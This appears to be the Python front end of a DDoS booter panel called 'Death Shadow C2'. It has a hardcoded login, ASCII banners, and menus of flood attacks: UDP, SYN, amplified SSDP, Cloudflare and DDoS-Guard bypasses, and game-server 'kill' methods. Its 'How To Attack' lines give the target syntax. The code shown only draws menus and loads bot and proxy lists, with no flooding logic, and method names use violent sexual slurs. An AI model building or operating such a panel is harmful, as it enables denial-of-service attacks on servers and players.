#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#TOOLS AUHTOR TRANSFORMER X BUMBLEBEE
import sys
import socket
import codecs
import time
import random
import threading
import getpass
import os
import urllib
import json
from time import sleep
from time import time as tt
nicknm = "AppocalypsE-NEXO"

print("""
\033[93m             ╔╦╗╔═╗╔═╗╔╦╗╦ ╦ \033[90m╔═╗╦ ╦╔═╗╔╦╗╔═╗╦ ╦
\033[93m                ║║║╣ ╠═╣ ║ ╠═╣─\033[90m──╚═╗╠═╣╠═╣ ║║║ ║║║║
\033[93m             ═╩╝╚═╝╩ ╩ ╩ ╩ ╩   \033[90m╚═╝╩ ╩╩ ╩═╩╝╚═╝╚╩╝
\033[93m            💻 Login The D\033[94mE Death Shadow 💻
\033[93m           ╦═══════════════════════════════════════╦
""")
username = str(input("\033[94m </> [DEATH-SHADOW] \033[93mUsername:"))
password = str(input("\033[94m </> [DEATH-SHADOW] \033[93mPassword:"))
if password == "ATOMICC2" and username == "ATOMICC2":
    print ("You have successfully entered your password")
    time.sleep(6)

else:
    print ("You entered the wrong password. Please login/return")
    time.sleep(6)
    exit()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

    proxies = open('proxies.txt').readlines()
    bots = len(proxies)
    fivemc2 = open('fivemc2.txt').readlines()
    bots = len(fivemc2)
    robloxc2 = open('robloxc2.txt').readlines()
    bots = len(robloxc2)
    ivankillerc2 = open('ivankillerc2.txt').readlines()
    bots = len(ivankillerc2)
    ivanmozila = open('ivanmozila.txt').readlines()
    bots = len(ivanmozila)
    Api = open('Api.txt').readlines()
    bots = len(Api)

def ascii_vro():
    clear()
    print(f'''
                  (\__.-. |
                  == ===_]+
                          |
 ` - .
       ` - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                     (\__.-. |
                     == ===_]+
                             |
 ` - .
       ` - .
            >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                         (\__.-. |
                         == ===_]+
                                 |
 ` - .
       ` - .
            - 
              ` >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - 
      ....       `   ....           ....           ....
     ||          >-> ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f"""
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m1337 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Death Shadow C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mGithub: DeathShadow11000 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mNew Methods \x1b[38;2;0;255;255m+ \x1b[38;2;233;233;233mNew UI!')
    print("")

mt = """
\033[93m                 ╔═════════════╦═════════════════════════════════╗
\033[93m                 ║             ╔╦╗╔═╗╦╔╗╔╔╦╗╔═╗╔╗╔╔═╗╔═╗                                                  ║
\033[93m                 ║             ║║║╠═╣║║║║ ║ ╠═╣║║║║  ║╣                                                            ║
\033[93m                 ║             ╩ ╩╩ ╩╩╝╚╝ ╩ ╩ ╩╝╚╝╚═╝╚═╝                                                           ║
\033[93m                 ║             👑\033[93mMAINTANCE L\033[94m🔥[WAITING TOOLS]🔥👑          ║
\033[93m                 ╚═════════════╩═════════════════════════════════╝
"""

methods = """
\x1b[38;2;0;221;34m                      ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\x1b[38;2;0;221;34m                      ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\x1b[38;2;0;221;34m                      ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\x1b[38;2;0;221;34m                      👑METHODS TOOLS DDOS👑
\x1b[38;2;0;204;111m  \x1b[38;2;0;221;34m╔═════\033[93m════════════════════╦═\033[92m═════════════\x1b[38;2;0;83;168m══════════════╗
\x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mm1. Game Bypass Methods. Commands = slaprape            \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mm2. Layer4. Commands = layer4                         \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mm3. VIP. Commands = vip         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mm4. Layer7. Commands = layer7        			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mm5. help. Commands = help         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mm6. plan. Commands = plan         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mm7 primitive. Commands = primitive         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mm8. raw. Commands = raw         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mmNon-Copyright Items Issue       		         \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  \x1b[38;2;0;221;34m╩════\033[93m═══════════════════╝  ╚══\033[92m═══════════\x1b[38;2;0;83;168m══════════════╩╗
"""

raw = """
\x1b[38;2;0;221;34m                         ╦═╗╔═╗╦ ╦  \x1b[38;2;0;241;29m╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\x1b[38;2;0;221;34m                         ╠╦╝╠═╣║║║\x1b[38;2;0;241;29m ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\x1b[38;2;0;221;34m                         ╩╚═╩ ╩╚╩╝  \x1b[38;2;0;241;29m╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\x1b[38;2;0;204;111m                              👑\x1b[38;2;0;204;111mRAW R\x1b[38;2;0;204;111mMethods👑
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔═══════\033[93m══════════════════\033[92m═╦═══════════════\x1b[38;2;0;83;168m═════════════╗
\x1b[38;2;0;204;111m            ║ \x1b[38;2;0;204;111mmudpraw \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmRaw UDP Flood \x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mmhexraw \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmRaw HEX Flood \x1b[38;2;0;204;111m    ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚╦══════\033[93m══════════════════\033[92m╦╩╦══════════════\x1b[38;2;0;83;168m════════════╦╝
\x1b[38;2;0;204;111m             ║ \x1b[38;2;0;204;111mmtcpraw \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmRaw TCP Flood \x1b[38;2;0;204;111m║ ║ \x1b[38;2;0;204;111mmvseraw \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmRaw VSE Flood \x1b[38;2;0;204;111m  ║
\x1b[38;2;0;204;111m             ║ \x1b[38;2;0;204;111mmstdraw \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmRaw STD Flood \x1b[38;2;0;204;111m║ ║ \x1b[38;2;0;204;111mmsynraw \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmRaw SYN Flood \x1b[38;2;0;204;111m  ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔╩══════\033[93m══════════════════\033[92m╝ ╚═══════════════\x1b[38;2;0;83;168m═══════════╩╗
\x1b[38;2;0;204;111m            ║    \x1b[38;2;0;204;111mmExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT] [THREADS]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚═══════\033[93m══════════════════\033[92m═════════════════\x1b[38;2;0;83;168m═════════════╝
"""

slaprape = """
\x1b[38;2;0;221;34m                                    ╔═╗╦  ╔═╗╔═╗\x1b[38;2;0;241;29m╦═╗╔═╗╔═╗╔═╗
\x1b[38;2;0;221;34m                                    ╚═╗║  ╠═╣╠═╝\x1b[38;2;0;241;29m╠╦╝╠═╣╠═╝║╣ 
\x1b[38;2;0;221;34m                                    ╚═╝╩═╝╩ ╩╩   \x1b[38;2;0;241;29m ╩╚═╩ ╩╩  ╚═╝
\x1b[38;2;0;204;111m                                         👑\x1b[38;2;0;204;111mSLAP M\x1b[38;2;0;204;111mR RAPE👑
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔══════\033[93m═════════════════\033[92m═══╦══════════════\x1b[38;2;0;83;168m══════════════╗
\x1b[38;2;0;204;111m            ║ \x1b[38;2;0;204;111mmovhslav \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmSlavic Flood \x1b[38;2;0;204;111m  ║ \x1b[38;2;0;204;111mmiotv1 \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmCustom Method!  \x1b[38;2;0;204;111m   ║
\x1b[38;2;0;204;111m            ║ \x1b[38;2;0;204;111mmcpukill \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmCpu Rape Flood\x1b[38;2;0;204;111m ║ \x1b[38;2;0;204;111mmiotv2 \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmCustom Method!  \x1b[38;2;0;204;111m   ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚╦═════\033[93m═════════════════\033[92m══╦╩╦═════════════\x1b[38;2;0;83;168m═════════════╦╝
\x1b[38;2;0;204;111m             ║ \x1b[38;2;0;204;111mmfivemkill \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmfivembypass \x1b[38;2;0;204;111m║ ║ \x1b[38;2;0;204;111mmiotv3 \x1b[38;2;0;204;111m-\x1b[38;2;0;204;111mm Custom Method!  \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m             ║ \x1b[38;2;0;204;111mmicmprape  \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmICMP Rape  \x1b[38;2;0;204;111m║ ║ \x1b[38;2;0;204;111mmssdp  \x1b[38;2;0;204;111m-\x1b[38;2;0;204;111mm Amped SSDP      \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m             ║ \x1b[38;2;0;204;111mmtcprape \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmRaping TCP   \x1b[38;2;0;204;111m║ ║ \x1b[38;2;0;204;111mmarknull \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmArk Method    \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m             ║ \x1b[38;2;0;204;111mmnforape \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmNfo Method   \x1b[38;2;0;204;111m║ ║ \x1b[38;2;0;204;111mm2kdown  \x1b[38;2;0;204;111m- \x1b[38;2;0;204;111mmNBA 2K Flood  \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔╩═════\033[93m═════════════════\033[92m══╝ ╚══════════════\x1b[38;2;0;83;168m════════════╩╗
\x1b[38;2;0;204;111m            ║    \x1b[38;2;0;204;111mmExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT] [THREADS]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚══════\033[93m═════════════════\033[92m══════════════════\x1b[38;2;0;83;168m══════════════╝
"""

primitive = """
\033[93m                          ╔╦╗╔═╗╔═╗╔╦╗╦ ╦ \033[90m╔═╗╦ ╦╔═╗╔╦╗╔═╗╦ ╦
\033[93m                          ║║║╣ ╠═╣ ║ ╠═╣─\033[90m──╚═╗╠═╣╠═╣ ║║║ ║║║║
\033[93m                          ═╩╝╚═╝╩ ╩ ╩ ╩ ╩   \033[90m╚═╝╩ ╩╩ ╩═╩╝╚═╝╚╩╝
\033[93m                            💻 We Are The D\033[94mE Death Shadow 💻
\033[93m                      ╦═══════════════════════════════════════╦
\033[93m            ╔══════════════════════════╦════════════════════════════╗
\033[93m            ║ \033[94mhomeslap    \033[95m. \033[94mr6kill     \033[93m║ \033[94mfivemtcp  \033[95m. \033[94mnfokill       \033[93m ║
\033[93m            ║ \033[94mark255      \033[95m. \033[94marklift    \033[93m║ \033[94mhotspot   \033[95m. \033[94mvpn           \033[93m ║
\033[93m            ║ \033[94mhydrakiller \033[95m. \033[94markdown    \033[93m║ \033[94mnfonull   \033[95m. \033[94mdhcp          \033[93m ║
\033[93m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[93m             ║ \033[94movhnat    \033[95m. \033[94movhamp     \033[93m║ ║ \033[94movhwdz    \033[95m. \033[94movhx         \033[93m║
\033[93m             ║ \033[94mnfodrop   \033[95m. \033[94mnfocrush   \033[93m║ ║ \033[94mnfodown   \033[95m. \033[94mnfox         \033[93m║
\033[93m             ║ \033[94mudprape   \033[95m. \033[94mudprapev3  \033[93m║ ║ \033[94mfortnite  \033[95m. \033[94mfortnitev2   \033[93m║
\033[93m             ║ \033[94mudprapev2 \033[95m. \033[94mudpbypass  \033[93m║ ║ \033[94mgreeth    \033[95m. \033[94mtelnet       \033[93m║
\033[93m             ║ \033[94mfivemv2   \033[95m. \033[94mr6drop     \033[93m║ ║\033[94m r6freeze  \033[95m. \033[94mkillall      \033[93m║
\033[93m             ║ \033[94m2krape    \033[95m. \033[94mfallguys   \033[93m║ ║ \033[94movhdown   \033[95m. \033[94movhkill      \033[93m║
\033[93m             ║ \033[94mfivemrape \033[95m. \033[94mfivemdown  \033[93m║ ║ \033[94mfivemv1   \033[95m. \033[94mfivemslump   \033[93m║
\033[93m             ║ \033[94mkillallv2 \033[95m. \033[94mkillallv3  \033[93m║ ║ \033[94mpowerslap \033[95m. \033[94mrapecom      \033[93m║
\033[93m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[93m            ║    \033[94mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[93m║
\033[93m            ╚═══════════════════════════════════════════════════════╝
"""

layer4 = """
\033[93m                          ╔╦╗╔═╗╔═╗╔╦╗╦ ╦ \033[90m╔═╗╦ ╦╔═╗╔╦╗╔═╗╦ ╦
\033[93m                          ║║║╣ ╠═╣ ║ ╠═╣─\033[90m──╚═╗╠═╣╠═╣ ║║║ ║║║║
\033[93m                          ═╩╝╚═╝╩ ╩ ╩ ╩ ╩   \033[90m╚═╝╩ ╩╩ ╩═╩╝╚═╝╚╩╝
\033[93m                            💻 LAYER4🔥 D\033[94mE 🔥Death Shadow 💻
\033[93m                      ╦═══════════════════════════════════════╦
\033[93m            ╔══════════════════════════╦════════════════════════════╗
\033[93m            ║  \033[94mudp \033[36m[IP] [TIME] [PORT]  \033[93m║   \033[94mvse \033[36m[IP] [TIME] [PORT]   \033[93m║
\033[93m            ║  \033[94mtcp \033[36m[IP] [TIME] [PORT]  \033[93m║   \033[94mack \033[36m[IP] [TIME] [PORT]   \033[93m║
\033[93m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[93m             ║ \033[94mstd \033[36m[IP] [TIME] [PORT] \033[93m║ ║ \033[94mdns \033[36m[IP] [TIME] [PORT]   \033[93m║
\033[93m             ║ \033[94msyn \033[36m[IP] [TIME] [PORT] \033[93m║ ║ \033[94movh \033[36m[IP] [TIME] [PORT]   \033[93m║
\033[93m             ║\033[36m- - - - - - - \033[93mhomerape \033[94m[IP] [TIME] [PORT] \033[36m- - - - - -\033[93m║
\033[93m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[93m            ║    \033[94mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[93m║
\033[93m            ╚═══════════════════════════════════════════════════════╝
"""

layer7 = """
\033[93m                          ╔╦╗╔═╗╔═╗╔╦╗╦ ╦ \033[90m╔═╗╦ ╦╔═╗╔╦╗╔═╗╦ ╦
\033[93m                          ║║║╣ ╠═╣ ║ ╠═╣─\033[90m──╚═╗╠═╣╠═╣ ║║║ ║║║║
\033[93m                          ═╩╝╚═╝╩ ╩ ╩ ╩ ╩   \033[90m╚═╝╩ ╩╩ ╩═╩╝╚═╝╚╩╝
\033[93m                            💻 LAYER7🔥 D\033[94mE 🔥Death Shadow 💻
\033[93m                      ╦═══════════════════════════════════════╦
\033[93m            ╔══════════════════════════╦════════════════════════════╗
\033[93m            ║  \033[94mhttp-stm \033[36m[IP] [TIME] [PORT]  \033[93m║   \033[94m \033[36m[kosong][IP] [TIME] [PORT]   \033[93m║
\033[93m            ║  \033[94mhttp-cld \033[36m[IP] [TIME] [PORT]  \033[93m║   \033[94mack \033[36m[kosong][IP] [TIME] [PORT]   \033[93m║
\033[93m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[93m             ║ \033[94mddos-guard \033[36m[IP] [TIME] [PORT] \033[93m║ ║ \033[94mdns \033[36m[kosong][IP] [TIME] [PORT]   \033[93m║
\033[93m             ║ \033[94mcloudflare \033[36m[IP] [TIME] [PORT] \033[93m║ ║ \033[94movh \033[36m[kosng][IP] [TIME] [PORT]   \033[93m║
\033[93m             ║\033[36m- - - - - - - \033[93mhomerape \033[94m[IP] [TIME] [PORT] \033[36m- - - - - -\033[93m║
\033[93m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[93m            ║    \033[94mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[93m║
\033[93m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """
\033[93m       </> [DEATH-SHADOWC2] | Api Connected [999999] | Backup Server [999999] | Online User [999999] | Admin: [TransformerXBumblebee] | POWER : {}% [STABLE]
\033[93m                          ╔╦╗╔═╗╔═╗╔╦╗╦ ╦ \033[90m╔═╗╦ ╦╔═╗╔╦╗╔═╗╦ ╦
\033[93m                          ║║║╣ ╠═╣ ║ ╠═╣─\033[90m──╚═╗╠═╣╠═╣ ║║║ ║║║║
\033[93m                          ═╩╝╚═╝╩ ╩ ╩ ╩ ╩   \033[90m╚═╝╩ ╩╩ ╩═╩╝╚═╝╚╩╝
\033[93m                            💻 We Are The D\033[94mE Death Shadow 💻
\033[93m                      ╦═══════════════════════════════════════╦
\033[93m                ╔═══════════════════════════════════════════════╗
\033[93m                ║\033[94m [API] Death Shadow vK By \033[95m[@RabbitLicon101] \033[94    ║
\033[93m                ║\033[94m [API] Type \033[94mhelp\033[94m to see help [RABBITvK]           ║
\033[93m                ╚═══════════════════════════════════════════════╝
\033[93m           ╚═╔══════════════════════════════════════════════╗═╝
\033[93m                 ║\033[94m [API] Connection Has Been \033[94m(Aᴘι Hᴀs Bᴇᴇɴ Coɴɴᴇcтιoɴ)║
\033[93m                 ╚══════════════════════════════════════════════╝
\033[93m            ╚═╔══════════════════════════════════════════╗══╝
\033[93m                  ║Instagram:  \033[95m[@RabbitLicon101] \033[94m [API]                     ║
\033[93m                  ║\033[94m Discord:\033[94\033[94m [@RabbitLicon] [API]                   ║
\033[93m                  ╚══════════════════════════════════════════╝
\033[93m             ╚══╔════════════════════════════════╗══╝
\033[93m                      ║ \033[93m[Aᴘι Hᴀs Bᴇᴇɴ Coɴɴᴇcтιoɴ]                         ║
\033[93m                      ╚════════════════════════════════╝
"""

attacked =  """
\033[93m                 ╔═════════════╦═════════════════════════════════╗
\033[93m                 ║         ╔═╗╔╦╗╔╦╗╔═╗╔═╗\033[94m╦╔═  ╔═╗╔╦╗╔═╗╦═╗╔╦╗╔═╗╔╦╗            ║
\033[93m                 ║         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  \033[94m╚═╗ ║ ╠═╣╠╦╝ ║ ║╣  ║║                                  ║
\033[93m                 ║         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  \033[94m╚═╝ ╩ ╩ ╩╩╚═ ╩ ╚═╝═╩╝                                  ║
\033[93m                 ║             💻\033[93mATTACKED L\033[94m 🔥[API CONNECTION ]🔥💻     ║
\033[93m                 ╚═════════════╩═════════════════════════════════╝
"""

helpservice =  """
\x1b[38;2;0;204;111m                    ╦ ╦╔═╗╦  ╔═╗\x1b[38;2;0;204;111m╔═╗╔═╗╦═╗╦  ╦╦╔═╗╔═╗
\x1b[38;2;0;204;111m                    ╠═╣║╣ ║  ╠═╝\x1b[38;2;0;204;111m╚═╗║╣ ╠╦╝╚╗╔╝║║  ║╣ 
\x1b[38;2;0;204;111m                    ╩ ╩╚═╝╩═╝╩\x1b[38;2;0;204;111m╚═╝╚═╝╩╚═ ╚╝ ╩╚═╝╚═╝
\x1b[38;2;0;204;111m                            👑\x1b[38;2;0;204;111mHELP H\x1b[38;2;0;204;111mS SERVICE👑                           
\x1b[38;2;0;204;111m           \x1b[38;2;0;221;34m╦════\033[93m══════════\033[92m══════════════\x1b[38;2;0;83;168m═══════════════════╦
\x1b[38;2;0;204;111m	       ║ \x1b[38;2;0;204;111mmMETHODS     ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \x1b[38;2;0;204;111mmPLAN        ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \x1b[38;2;0;204;111mmVIP         ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \x1b[38;2;0;204;111mmLAYER4      ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \x1b[38;2;0;204;111mmPRIMITVE    ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \x1b[38;2;0;204;111mmSLAPRAPE      ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m           \x1b[38;2;0;221;34m╩════\033[93m══════════\033[92m══════════════\x1b[38;2;0;83;168m═══════════════════╩

"""
vip = """
\x1b[38;2;0;204;111m                                 ╦  ╦╦╔═╗  ╔═╗\x1b[38;2;0;204;111m╔═╗╔═╗╔═╗╔═╗
\x1b[38;2;0;204;111m                                 ╚╗╔╝║╠═╝  \x1b[38;2;0;204;111m╠═╣║  ║  ║╣ ╚═╗
\x1b[38;2;0;204;111m                                    ╚╝ ╩╩    ╩ ╩\x1b[38;2;0;204;111m╚═╝╚═╝╚═╝╚═╝
\x1b[38;2;0;204;111m                                  👑MY VIP ACCESS = \033[0;94mTRUE👑
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╔════\033[93m═════════╦═══════════\033[92m════════\x1b[38;2;0;83;168m══════════════╗
\x1b[38;2;0;204;111m                 ║ RAW         ║ Shows All VIP Raw Methods       ║
\x1b[38;2;0;204;111m                 ║ LAYER7      ║ Shows All VIP L7 Methods        ║
\x1b[38;2;0;204;111m                 ║ PRIMITIVE   ║ Shows All VIP Primitive Methods ║
\x1b[38;2;0;204;111m                 ║ PIT         ║ Shows All VIP Pit API Methods    ║
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚════\033[93m═════════╩═══════════\033[92m════════\x1b[38;2;0;83;168m══════════════╝
"""

plan =  """
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╔═════\033[93m════════╦═══════════\033[92m════════\x1b[38;2;0;83;168m══════════════╗
\x1b[38;2;0;204;111m                 ║          ╔═╗╦  ╔═╗╔╗╔\x1b[38;2;0;204;111m╔═╗╔═╗╦═╗╦  ╦╦╔═╗╔═╗
\x1b[38;2;0;204;111m                 ║          ╠═╝║  ╠═╣║║║\x1b[38;2;0;204;111m ╚═╗║╣ ╠╦╝╚╗╔╝║║  ║╣ 
\x1b[38;2;0;204;111m                 ║          ╩  ╩═╝╩ ╩╝╚╝\x1b[38;2;0;204;111m╚═╝╚═╝╩╚═ ╚╝ ╩╚═╝╚═╝
\x1b[38;2;0;204;111m                 ║              👑\x1b[38;2;0;204;111mPLAN L\x1b[38;2;0;204;111m SERVICE👑
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mVIP ACCES = TRUE
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mUSERNAME = TransformerXBumblebee                
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mADMIN ACCES = TRUE
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mEXPIRED TIME = 99000000
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mAPI ACCESS = TRUE
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mBOTS ACCESS = TRUE
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mPLAYER ACCESS = TRUE
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚═════\033[93m════════╩════════════\033[92m════════\x1b[38;2;0;83;168m═════════════╝
"""

bots =  """
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╔═════\033[93m════════╦═════════════\033[92m═══════\x1b[38;2;0;83;168m═════════════╗
\x1b[38;2;0;204;111m                 ║                ╔╗ ╔═╗╔╦╗╔═╗\x1b[38;2;0;204;111m╔═╗╔═╗╔═╗╔═╗╔═╗
\x1b[38;2;0;204;111m                 ║                ╠╩╗║ ║ ║ ╚═╗  \x1b[38;2;0;204;111m╠═╣║  ║  ║╣ ╚═╗
\x1b[38;2;0;204;111m                 ║                ╚═╝╚═╝ ╩ ╚═╝ \x1b[38;2;0;204;111m ╩ ╩╚═╝╚═╝╚═╝╚═╝
\x1b[38;2;0;204;111m                 ║              👑\x1b[38;2;0;204;111mBOTS L\x1b[38;2;0;204;111m ACCES👑
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mVIP ACCES = \x1b[38;2;0;204;111m[999999]
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mDEVELOPER ACCES = \x1b[38;2;0;204;111m[999999]                
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mADMIN ACCES = \x1b[38;2;0;204;111m[999999]
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mEXPIRED TIME = \x1b[38;2;0;204;111m[99/99/9999]
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mAPI ACCESS = \x1b[38;2;0;204;111m[99999]
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mBOTS ACCESS = \x1b[38;2;0;204;111m[999999]
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mUSER ACCESS = \x1b[38;2;0;204;111m[99999]
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚═════\033[93m════════╩══════════════\033[92m═══════\x1b[38;2;0;83;168m════════════╝
"""

cooldown = """
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╔═════\033[93m════════╦══════════════\033[92m══════\x1b[38;2;0;83;168m═════════════╗
\x1b[38;2;0;204;111m                 ║             ╦  ╔═╗╔═╗╔╦╗╦╔╗╔╔═╗
\x1b[38;2;0;204;111m                 ║             ║  ║ ║╠═╣ ║║║║║║║ ╦
\x1b[38;2;0;204;111m                 ║             ╩═╝╚═╝╩ ╩═╩╝╩╝╚╝╚═╝
\x1b[38;2;0;204;111m                 ║              👑\x1b[38;2;0;204;111mLOADING L\x1b[38;2;0;204;111m TOOLS DDOS👑
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚═════\033[93m════════╩══════════════\033[92m══════\x1b[38;2;0;83;168m═════════════╝
"""

